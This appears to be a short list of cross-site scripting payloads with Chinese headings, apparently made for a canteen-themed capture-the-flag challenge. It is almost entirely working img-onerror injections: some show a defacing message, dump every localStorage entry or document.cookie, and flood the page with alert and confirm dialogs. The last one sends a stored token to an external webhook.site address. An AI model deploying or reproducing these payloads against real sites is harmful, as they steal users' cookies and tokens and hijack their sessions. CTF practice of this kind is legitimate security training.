<img src=x onerror="alert('董小含到此一游')">


弹出所有的localStorage键值对
<img src=x onerror="
for (let i = 0; i < localStorage.length; i++) {
  let k = localStorage.key(i);
  alert(k + '=' + localStorage.getItem(k));
}
">

弹出cookie：
<img src=x onerror="alert(document.cookie)">

弹出n次：
<img src=x onerror="
let i = 0;
let id = setInterval(() => {
  alert(++i);
  if (i === 9) clearInterval(id);
}, 10);
">

<img src=x onerror="
for (let i = 0; i < 999; i++) {
  if (!confirm('是否坚持做难吃的饭，这是给你的第' + (i+1) + '次机会 ')) break;
}
">


值外带：
<img src=x onerror="
new Image().src='https://webhook.site/abff82a7-d873-446e-9e16-fed01d336ec7?token='
+ encodeURIComponent(localStorage.getItem('canteen-ctf-token'));
">

